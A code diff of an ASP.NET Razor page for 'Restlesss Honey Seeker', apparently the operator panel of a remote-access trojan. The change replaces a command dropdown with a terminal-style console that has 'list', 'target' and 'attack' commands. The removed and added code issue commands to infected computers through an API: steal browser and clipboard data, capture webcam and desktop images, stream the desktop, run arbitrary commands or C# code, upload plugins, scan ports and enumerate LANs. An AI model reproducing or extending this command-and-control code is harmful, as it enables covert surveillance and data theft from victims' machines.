@@ -1,15 +1,13 @@
 ﻿@{
     ViewBag.Title = "Restlesss Honey Seeker";
 }
-
 <div class="row">
-    <div class="col-md-9">
-        <div class="form-group">
-            <label for="computer">Computer</label>
-            <select id="computer" class="form-control"></select>
-        </div>
+    <div class="col-md-12">
+        <div id="containerDiv">...</div>
     </div>
-    <div class="col-md-2 col-lg-offset-1">
+</div>
+<div class="row">
+    <div class="col-md-12">
         <div class="form-group">
             <label for="computer">Upload</label>
             <form role="form" class="form-inline">
@@ -17,366 +15,337 @@
                     <option value="@Library.ECommand.DOWNLOAD_FILE">File</option>
                     <option value="@Library.ECommand.UPLOAD_PLUGIN">Plugin</option>
                 </select>
+                <input id="files" type="file" />
             </form>
         </div>
     </div>
 </div>
 <div class="row">
-    <div class="col-md-9">
-        <div class="form-group">
-            <label for="command">Command</label>
-            <select id="command" class="form-control">
-                @*<option value="@Library.ECommand.DO_NOTHING">Do nothing</option>*@
-                <option value="@Library.ECommand.UPLOAD_PORTSCAN">Portscan</option>
-                <option value="@Library.ECommand.SYSCMD_SHUTDOWN">Shutdown</option>
-                <option value="@Library.ECommand.SYSCMD_RESTART">Restart</option>
-                <option value="@Library.ECommand.SYSCMD_LOGOFF">Logoff</option>
-                <option value="@Library.ECommand.SYSCMD_LOCKCOMPUTER">Lock</option>
-                <option value="@Library.ECommand.SYSCMD_HIBERNATE">Hibernate</option>
-                <option value="@Library.ECommand.SYSCMD_SLEEP">Sleep</option>
-                <option value="@Library.ECommand.UPLOAD_IMAGE">Get desktop image</option>
-                <option value="@Library.ECommand.UPLOAD_WEBCAM_IMAGE">Get webcam image</option>
-                <option value="@Library.ECommand.UPLOAD_PROCESS_INFO">Get processes</option>
-                <option value="@Library.ECommand.KILL_PROCESS">Kill Process</option>
-                <option value="@Library.ECommand.UPLOAD_PORT_INFO">Get ports</option>
-                <option value="@Library.ECommand.UPLOAD_SHARES">Get shares</option>
-                <option value="@Library.ECommand.UPLOAD_LAN_COMPUTERS">Get LAN computers</option>
-                <option value="@Library.ECommand.UPLOAD_GATEWAYS">Get gateways</option>
-                <option value="@Library.ECommand.UPLOAD_CLIPBOARD_DATA">Get Clipboard data</option>
-                <option value="@Library.ECommand.UPLOAD_BROWSER_DATA">Get browser data</option>
-                @*<option value="@Library.ECommand.DOWNLOAD_FILE">Upload a file</option>*@
-                <option value="@Library.ECommand.UPLOAD_FILE">Download a file</option>
-                <option value="@Library.ECommand.UPLOAD_FILE_EVENTS">Get file events</option>
-                <option value="@Library.ECommand.STREAM_DESKTOP">Start streaming desktop</option>
-                <option value="@Library.ECommand.STOP_STREAM_DESKTOP">Stop streaming desktop</option>
-                <option value="@Library.ECommand.EXECUTE_COMMAND">Execute a command</option>
-                <option value="@Library.ECommand.SET_TRANSMISSION_INTERVAL">Set transmission time</option>
-                <option value="@Library.ECommand.EXECUTE_PLUGIN">Execute Plugin</option>
-                <option value="@Library.ECommand.KILL_PLUGIN">Kill Plugin</option>
-                <option value="@Library.ECommand.EXECUTE_CODE">Execute C# Code</option>
-                @*<option value="@Library.ECommand.UPLOAD_PLUGIN">Upload Plugin</option>*@
-            </select>
-        </div>
-
-        <div class="form-group" id="filename_div">
-            <label id="file_title" for="FileName">File</label>
-            <input type="text" class="form-control" name="FileName" id="FileName" />
-        </div>
-
-        <div class="form-group" id="parameters_div">
-            <label id="parameters_title" for="Parameters">Parameters</label>
-            <span id="param_body">
-                <input type="text" class="form-control" name="Parameters" id="Parameters" />
-            </span>
-        </div>
-
-        <div class="form-group" style="vertical-align:top">
-            <button type="submit" id="execute" class="btn btn-primary">Execute</button>
-        </div>
-    </div>
-    <div class="col-md-2">
-        <form role="form" class="form-inline">
-            <input id="files" type="file" />
-            <input type="button" id="btnUpload" value="Upload" class="btn btn-default" />
-        </form>
+    <div class="col-md-12">
+        <div class="console"></div>
     </div>
 </div>
-<div id="data"></div>
-<ul id="images"></ul>
+<script type="text/javascript" src="~/Content/jquery.console.js"></script>
+<script type="text/javascript">
+    var controller = null;
 
-<script>
-    var cursorX = 0;
-    var cursorY = 0;
-    var computerList = {};
-    var computerHash = "";
-    var imageStreamTimer = null;
-
-    function updateImage() {
-        $.get('/Home/GetImageLastAccessTime?image=latest.jpg').done(function (lastAccessTime) {
-            setTimeout(function () {
-                $('#data').html("");
-                var img = $('<img />').attr('width', '100%').attr('src', "/Home/GetImage?image=latest.jpg&" + lastAccessTime);
-                $('#data').html(img);
-            }, 2000);
-        });
-    }
-    function startStreamImage(time) {
-        time = parseInt(time) + 2000;
-        imageStreamTimer = setInterval(function () {
-            updateImage();
-        }, time);
-    }
-    function stopStreamImage() {
-        if (imageStreamTimer != null) {
-            clearInterval(imageStreamTimer);
-        }
-    }
-    function updateProcesses() {
-        fileToOpen = "processes.txt";
-        //$.get('/Home/GetProcesses/' + computerHash)
-        //    .done(function (text) {
-        //        var txt = $('<textarea />').addClass('form-control').attr('cols', '100').attr('rows', '20').val(text);
-        //        $('#data').html(txt);
-        //    });
-    }
-    function updateFileEvents() {
-        $.get('/Home/GetFileEvents')
-            .done(function (text) {
-                var txt = $('<textarea />').addClass('form-control').attr('cols', '100').attr('rows', '20').val(text);
-                $('#data').html(txt);
-            });
-    }
-    function updatePortInfo() {
-        $.get('/Home/GetPortInfo', function (json) {
-            var txt = $('<textarea />').attr('cols', '100').attr('rows', '20').val(json);
-            $('#data').html(txt);
-        });
-    }
-    function StartStreamDesktop() {
-        var imageStream = $('<img />').attr('id', 'streamDesktop');
-        $('#data').html(imageStream);
-        $('#streamDesktop')
-            .click(function (e) {
-                cursorX = e.offsetX;
-                cursorY = e.offsetY;
-                //alert(cursorX + ", " + cursorY);
-                //editSettings('MOVE_CURSOR', imageQuality, "", "", "", "", cursorX, cursorY, "");
-                editSettings('MOVE_CURSOR', "", "", cursorX, cursorY, "");
-
-            });
-        /*$(window).keyup(function(e) {
-            editSettings('MOVE_CURSOR', imageQuality, "", "", "", cursorX, cursorY, e.keyCode);
-        });*/
-        setInterval(function () {
-            imageStream.attr('src', "/DataFromClient/latest.jpg");
-        }, 1000);
-    }
-
-    function loadComputers(computerList) {
-        $.getJSON('/Home/GetComputers').done(function (data) {
-            var json = JSON.parse(data);
-            //console.log(json);
-            var newSize = _.size(json);
-            if (_.size(computerList) !== newSize) {
-                computerList = {};
-                _.extend(computerList, json);
-                $('#computer')
-                    .find('option').remove().end()
-                    .append($('<option />').attr('value', 'none').html("None"))
-                    .append($('<option />').attr('value', 'all').html("All"));
-                $.each(json, function (k, v) {
-                    //var value = v['Name'] + " (" + v['IpExternal'] + " - " + v['Hash'] + ")";
-                    var value = v['Name'] + " (" + v['IpExternal'] + ")";
-                    $('#computer').append($('<option />').attr('value', v['Hash']).html(value));
-                });
-            }
-            if (newSize == 0) {
-                $('#computer')
-                    .find('option').remove().end()
-                    .append($('<option />').attr('value', 'none').html("None"))
-            }
-        });
-    }
-    var fileToOpen = "";
-    function editSettings(command, file, parameters, cursorX, cursorY, keyCode) {
-        var data = {
-            'ComputerHash': computerHash,
-            'Command': command,
-            'File': file,
-            'Parameters': parameters,
-            'HasExectuted': false,
-            'cursorX': cursorX,
-            'cursorY': cursorY,
-            'keyCode': keyCode
-        };
-
-        //alert(data['computerHash']);
-        $.post('/api/RHS/SaveSettings', data, function (result) {
-            console.log("result: " + result);
-            switch (command) {
-                case '@Library.ECommand.UPLOAD_PORTSCAN':
-                    fileToOpen = "portscan.txt";
-                    break;
-                case '@Library.ECommand.UPLOAD_IMAGE':
-                    //updateImage();
-                    fileToOpen = "desktop.jpg";
-                    break;
-                case '@Library.ECommand.UPLOAD_WEBCAM_IMAGE':
-                    fileToOpen = "webcam.jpg";
-                    break;
-                case '@Library.ECommand.STREAM_DESKTOP':
-                    //startStreamImage(parameters);
-                    //StartStreamDesktop();
-                    break;
-                case '@Library.ECommand.STOP_STREAM_DESKTOP':
-                    //stopStreamImage();
-                    break;
-                case '@Library.ECommand.UPLOAD_PORT_INFO':
-                    //updatePortInfo();
-                    fileToOpen = "ports.txt";
-                    break;
-                case '@Library.ECommand.UPLOAD_SHARES':
-                    fileToOpen = "shares.txt";
-                    break;
-                case '@Library.ECommand.UPLOAD_LAN_COMPUTERS':
-                    fileToOpen = "lan_computers.txt";
-                    break;
-                case '@Library.ECommand.UPLOAD_GATEWAYS':
-                    fileToOpen = "gateways.txt";
-                    break;
-                case '@Library.ECommand.EXECUTE_PLUGIN':
-                    //updateData();
-                    break;
-                case '@Library.ECommand.UPLOAD_PROCESS_INFO':
-                    updateProcesses();
-                    break;
-                case '@Library.ECommand.UPLOAD_FILE_EVENTS':
-                    //updateFileEvents();
-                    fileName = "fileevents.txt";
-                    break;
-            }
-            $("#data").html("");
-            setTimeout(function () {
-                $("#data").html("<a target='_blank' href='/Home/GetFile?file=" + fileToOpen + "'>open</a>");
-            }, 7000);
-        }, "json");
-        //.fail(function (data) {
-        //    console.log('failed');
-        //    resetSettings();
-        //});
-    }
     $(function () {
 
-        $("#btnUpload").click(function (e) {
-            e.preventDefault();
-            var data = new FormData();
-            var files = $("#files").get(0).files;
-            if (files.length > 0) {
-                data.append("UploadedFile", files[0]);
-            }
-            var req = $.ajax({
-                type: 'POST',
-                url: '/Home/UploadFile',
-                contentType: false,
-                processData: false,
-                data: data
-            });
-            req.done(function (xhr, status) {
-                //alert(status);
-                if (status == 'success') {
-                    //$('#FileName').val($("#files").val());
-                    var command = $("#uploadType").find(':selected').val();
-                    var file = $("#files").val();
-                    editSettings(command, file, '', cursorX, cursorY, "");
+        $('input[type="file"]').change(function () {
+            //alert("uploading");
+            //commands['upload']("file", function (result) {
+            //    //alert("OK");
+            //});
+        });
+
+        var console = $('.console');
+        controller = console.console({
+            promptLabel: '> ',
+            commandValidate: function (line) {
+                if (line == "") return false;
+                else return true;
+            },
+            commandHandle: function (line, report) {
+                var isDone = false;
+                executeCommand(line, function (result) {
+                    isDone = true;
+                    report(result);
+                });
+                if (!isDone) {
+                    report("");
+                    return false;
                 }
-            });
+            },
+            animateScroll: true,
+            promptHistory: true,
+            welcomeMessage: "Type 'help' for a list of commands"
         });
-
-        //setInterval(function () {
-        //    loadComputers(computerList);
-        //}, 10000);
-
-        resetSettings();
-        loadComputers(computerList);
-
-        $('#computer').change(function () {
-            computerHash = $(this).find(':selected').val();
-            //alert(computerHash);
-        });
-
-        $('#command').on("keyup", function () {
-            $(this).trigger("change");
-        });
-
-        $('#command').change(function () {
-            var command = $(this).find(':selected').val();
-            $("#file_title").show().html("File");
-            $("#parameters_title").show().html("Parameters");
-            $("#parameters_div").show();
-            $("#filename_div").show();
-            $("#param_body").html('<input type="text" class="form-control" name="Parameters" id="Parameters" />');
-            switch (command) {
-                case '@Library.ECommand.UPLOAD_PORTSCAN':
-                    $("#file_title").hide();
-                    $("#parameters_title").html("Port (e.g. 80, 80-1024);[IP Address] (optional, localhost is standard);[TCP or UDP] (optional, TCP is standard)");
-                    $("#filename_div").hide();
-                    break;
-                case '@Library.ECommand.UPLOAD_IMAGE':
-                    $("#file_title").hide();
-                    $("#parameters_title").html("Quality (1-100)");
-                    $("#filename_div").hide();
-                    break;
-                case '@Library.ECommand.UPLOAD_WEBCAM_IMAGE':
-                    $("#file_title").hide();
-                    $("#parameters_title").html("Quality (1-100)");
-                    $("#filename_div").hide();
-                    break;
-                case '@Library.ECommand.UPLOAD_PROCESS_INFO':
-                    $("#parameters_div").hide();
-                    $("#filename_div").hide();
-                    break;
-                case '@Library.ECommand.KILL_PROCESS':
-                    $("#parameters_title").html("Process Name or ID");
-                    $("#filename_div").hide();
-                    break;
-                case '@Library.ECommand.STREAM_DESKTOP':
-                    $("#file_title").hide();
-                    $("#parameters_div").show();
-                    $("#parameters_title").html("Interval (1000-10000ms);Quality (1-100pct)");
-                    $("#filename_div").hide();
-                    break;
-                case '@Library.ECommand.UPLOAD_CLIPBOARD_DATA':
-                    $("#parameters_div").hide();
-                    $("#filename_div").hide();
-                    break;
-                case '@Library.ECommand.UPLOAD_FILE':
-                    $("#parameters_div").hide();
-                    break;
-                case '@Library.ECommand.UPLOAD_FILE_EVENTS':
-                    $("#parameters_div").hide();
-                    $("#filename_div").hide();
-                    break;
-                case '@Library.ECommand.UPLOAD_PORT_INFO':
-                    $("#parameters_div").hide();
-                    $("#filename_div").hide();
-                    break;
-                case '@Library.ECommand.SET_TRANSMISSION_INTERVAL':
-                    $("#parameters_title").html("Interval in ms");
-                    $("#filename_div").hide();
-                    break;
-                case '@Library.ECommand.EXECUTE_COMMAND':
-                    $("#filename_div").show();
-                    $("#parameters_div").show();
-                    break;
-                case '@Library.ECommand.EXECUTE_PLUGIN':
-                    $("#file_title").html("Plugin filename");
-                    break;
-                case '@Library.ECommand.KILL_PLUGIN':
-                    $("#file_title").html("Plugin filename");
-                    $("#parameters_div").hide();
-                    break;
-                case '@Library.ECommand.EXECUTE_CODE':
-                    $("#filename_div").hide();
-                    $("#parameters_title").html("C# code (eg: MessageBox.Show(\"Hello World\");");
-                    $("#param_body").html('<textarea rows="5" style="width:100%;" class="form-control" name="Parameters" id="Parameters"></textarea>');
-                    break;
-                default:
-                    $("#parameters_div").hide();
-                    $("#filename_div").hide();
-                    break;
-            }
-        });
-
-        $('#execute').click(function () {
-            var command = $('#command').find(':selected').val();
-            var file = $('#FileName').val();
-            var parameters = $('#Parameters').val();
-            editSettings(command, file, parameters, cursorX, cursorY, "");
-            return false;
-        });
+        //controller.promptText('5 * 4');
     });
 
-    function resetSettings() {
-        editSettings('DO_NOTHING', "", "", cursorX, cursorY, "");
+    function executeCommand(input, onSuccess) {
+        var inputSplit = input.split(' ');
+        var command = inputSplit.length > 0 ? inputSplit[0] : null;
+        var parameters = inputSplit.length > 1 ? inputSplit.slice(1, inputSplit.length) : null;
+        if (command && typeof commands[command] === 'function') {
+            commands[command](parameters, onSuccess);
+        }
+    }
+
+    var computers = [],
+        currentTarget = null;
+
+    var returnResult = [];
+
+    function getResult() {
+        var result = returnResult.slice(0);
+        returnResult = [];
+        return result;
+    }
+
+    function addLine(text, hasMargin) {
+        text += hasMargin ? "\t" : "";
+        returnResult.push({ msg: text, className: "jquery-console-message-value" });
+    }
+
+    var commands = {
+        upload: function (parameters, onSuccess) {
+            var data = new FormData();
+            var files = $("#files").get(0).files;
+            var command = '@Library.ECommand.DOWNLOAD_FILE';
+            if (files.length > 0) {
+                if (parameters.length == 1) {
+                    var param1 = ('' + parameters[0]).toLowerCase();
+                    switch (param1) {
+                        case 'file':
+                            command = '@Library.ECommand.DOWNLOAD_FILE';
+                            break;
+                        case 'plugin':
+                            command = '@Library.ECommand.UPLOAD_PLUGIN';
+                            break;
+                    }
+                }
+                var fileName = files[0]['name'];
+                addLine("Uploading file: " + fileName);
+                data.append("UploadedFile", files[0]);
+                var req = $.ajax({
+                    type: 'POST',
+                    url: '/Home/UploadFile',
+                    contentType: false,
+                    processData: false,
+                    data: data
+                });
+                req.done(function (xhr, status) {
+                    if (status == 'success') {
+                        addLine("Done uploading!");
+                        onSuccess(getResult());
+                        //var file = $("#files").val();
+                        //alert(file + " - " + files[0]['name']);
+                        editSettings(command, fileName, '', 0, 0, "");
+                    }
+                });
+            }
+            onSuccess(getResult());
+        },
+        help: function (parameters, onSuccess) {
+            addLine("Available server commands:");
+            addLine("help", true);
+            addLine("cmd (shows a list of client commands)", true);
+            addLine("list (shows a list of clients)", true);
+            addLine("clear (clear input)", true);
+            addLine("target", true);
+            onSuccess(getResult());
+        },
+        cmd: function (parameters, onSuccess) {
+            addLine("Available client commands:");
+            $.get('/Home/GetAvailableCommands').done(function (text) {
+                var commands = JSON.stringify(text);
+                $.each(JSON.parse(commands), function (k, v) {
+                    addLine(v, true);
+                });
+                onSuccess(getResult());
+            });
+        },
+        list: function (parameters, onSuccess) {
+            addLine("Available computers:");
+            $.getJSON('/Home/GetComputers').done(function (data) {
+                computers = [];
+                var dataParsed = JSON.parse(data);
+                //console.log(computers);
+                $.each(dataParsed, function (k, v) {
+                    //console.log(v);
+                    computers.push({ id: "" + k, val: v });
+                    addLine(k + ": " + getComputerDescription(v), true);
+                });
+                onSuccess(getResult());
+            });
+        },
+        clear: function (parameters, onSuccess) {
+            controller.reset();
+            addLine("Type 'help' for a list of commands.", "white");
+            onSuccess(getResult());
+        },
+        cls: function (parameters, onSuccess) {
+            commands["clear"]();
+        },
+        attack: function (parameters, onSuccess) {
+            if (currentTarget) {
+                addLine("Attacking Target: '" + getComputerDescription(currentTarget) + "'.");
+                if (parameters && parameters.length >= 1) {
+                    var command = parameters[0];
+                    var parsArray = parameters.slice(1, parameters.length);
+                    var pars = "";
+                    for (var i = 0; i < parsArray.length; i++) {
+                        pars += parsArray[i] + " ";
+                    }
+                    pars = pars.trim();
+                    addLine("Command: " + command);
+                    addLine("Parameters: " + pars);
+                    editSettings(command, "", pars, 0, 0, "");
+                    getStatus(onSuccess);
+                }
+                //var command = $('#command').find(':selected').val();
+                //var file = $('#FileName').val();
+                //var parameters = $('#Parameters').val();
+                //editSettings(command, file, parameters, cursorX, cursorY, "");
+                //currentTarget = null;
+            } else {
+                addLine("No target selected... Use 'list' to see a list of computers.");
+            }
+            onSuccess(getResult());
+        },
+        target: function (parameters, onSuccess) {
+            if (parameters) {
+                if (parameters.length == 1) {
+                    var param1 = ('' + parameters[0]).toLowerCase();
+                    if (param1 == 'remove' || param1 == 'clear') {
+                        addLine("Target '" + getComputerDescription(currentTarget) + "' removed.");
+                        currentTarget = null;
+                    }
+                        //else if (param1.substr(0, 4) == 'exec') {
+
+                        //}
+                    else {
+                        var obj = _.findWhere(computers, { 'id': param1 });
+                        if (obj && obj['val']) {
+                            currentTarget = obj['val'];
+                            addLine("New Target: " + getComputerDescription(currentTarget));
+                        }
+                    }
+                }
+                //for (var i = 0; i < parameters.length; i++) {
+                //    addLine("Parameters: " + parameters[i]);
+                //}
+            }
+            else {
+                if (currentTarget) {
+                    addLine("Current Target: " + getComputerDescription(currentTarget));
+                }
+                else {
+                    addLine("No target selected... Use 'list' to see a list of computers.");
+                }
+            }
+            onSuccess(getResult());
+        }
+    }
+
+    var psChecker;
+
+    function getStatus(onSuccess) {
+        addLine("waiting for response (data) from client...");
+        onSuccess(getResult());
+        psChecker = setInterval(function () {
+            $.ajax({
+                url: '/api/rhs/getsettings',
+                dataType: 'text',
+                success: function (text) {
+                    var json = JSON.parse(text);
+                    //console.log(json['ComputerHash']);
+                    if (currentTarget != null) {
+                        if (json['ComputerHash'] == null) {
+                            clearInterval(psChecker);
+                            $("#containerDiv").text("done!");
+                            $.ajax({
+                                url: '/Home/GetFile?computerHash=' + currentTarget['Hash'] + '&file=result.txt',
+                                dataType: 'text',
+                                success: function (result) {
+                                    //currentTarget = null;
+                                    addLine(result);
+                                    onSuccess(getResult());
+                                }
+                            });
+                        }
+                        else {
+                            $("#containerDiv").text("working...");
+                        }
+                    }
+                }
+            });
+        }, 500);
+    }
+
+
+    function getComputerDescription(v) {
+        if (v) {
+            return v['Name'] + " (" + v['IpExternal'] + ")";
+        }
+        return "No computer selected";
+    }
+
+    function editSettings(command, file, parameters, cursorX, cursorY, keyCode) {
+        console.log(currentTarget);
+        if (currentTarget) {
+            var data = {
+                'ComputerHash': currentTarget['Hash'],
+                'Command': command,
+                'File': file,
+                'Parameters': parameters,
+                //'HasExectuted': false,
+                'cursorX': cursorX,
+                'cursorY': cursorY,
+                'keyCode': keyCode
+            };
+            //alert(data['computerHash']);
+            $.post('/api/RHS/SaveSettings', data, function (result) {
+                console.log("result: " + result);
+                //setTimeout(function () {
+                //    $("#data").html("<a target='_blank' href='/Home/GetFile?file=" + fileToOpen + "'>open</a>");
+                //}, 7000);
+            }, "json");
+            //.fail(function (data) {
+            //    console.log('failed');
+            //});
+        }
     }
 </script>
+<style type="text/css" media="screen">
+    div.console {
+        font-size: 14px;
+        line-height: 20px;
+        margin-top: 1em;
+        color: #FFF;
+        font-family: 'Lucida Console', Consolas, 'Courier New', monospace;
+        word-wrap: break-word;
+    }
+
+        div.console div.jquery-console-inner {
+            width: 98%;
+            height: 400px;
+            background: #000;
+            padding: 0.5em;
+            overflow: auto;
+        }
+
+        div.console div.jquery-console-prompt-box {
+            color: #fff;
+            font-family: monospace;
+        }
+
+        div.console div.jquery-console-focus span.jquery-console-cursor {
+            background: #333;
+            color: #eee;
+            font-weight: bold;
+        }
+
+        div.console div.jquery-console-message-error {
+            color: #ef0505;
+            font-family: sans-serif;
+            font-weight: bold;
+            padding: 0.1em;
+        }
+
+        div.console div.jquery-console-message-success {
+            color: #187718;
+            font-family: monospace;
+            padding: 0.1em;
+        }
+
+        div.console span.jquery-console-prompt-label {
+            font-weight: bold;
+        }
+</style>
+<noscript>
+    <p>
+        <strong>Please enable JavaScript or upgrade your browser.</strong>
+    </p>
+</noscript>
